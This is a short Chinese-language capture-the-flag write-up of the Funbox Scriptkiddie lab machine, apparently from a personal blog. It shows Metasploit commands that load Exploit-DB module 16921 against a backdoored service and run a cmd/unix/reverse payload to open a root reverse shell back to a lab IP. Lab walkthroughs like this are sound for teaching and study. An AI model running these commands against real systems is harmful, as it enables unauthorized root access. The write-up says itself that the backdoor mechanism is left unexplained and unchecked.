ailx10说：这篇是我2022年8月写的。Funbox Scriptkiddie 这一台，前面照样先枚举服务和用户，随后扫描结果把我带到了一个后门线索。找到对应模块后载入 Metasploit，最后直接拿到了高权限连接，所以后半段比不少靶机短。我把这次过程记下来，也不想让“直接 root”听起来像额外做完了一整套提权：连接身份来自那个服务的运行状态，并不是凭空多了一步。原文对具体服务和后门机制讲得不多，要理解它，还是得把扫描发现、模块前提和截图放在一起看。

---

Funbox Scriptkiddie枚举服务及bill用户，扫描发现后门，将16921 Ruby模块加载MSF后直接得到root连接。

阅读说明：漏洞服务版本和后门机制文字未给，需要截图补证；payload重复前缀疑似排版，直接root来自服务身份不是独立提权。 原实验环境和代码未重新运行，涉及截图的关键细节仍待核对。

### 7、将rb文件放在msf 框架中，启动msf console

```
mv /usr/share/exploitdb/exploits/linux/remote/16921.rb /usr/share/metasploit-framework/modules/exploits/mytest
reload_all
use exploit/mytest/16921 
```

![](/notes-assets/65e3779fa9f09ca1a1b5.jpg)

### 8、利用历史服务，连接进程以 root 身份运行

```
set payload payload/cmd/unix/reverse
set LHOST 192.168.199.247
set RHOSTS 192.168.199.207
run
```
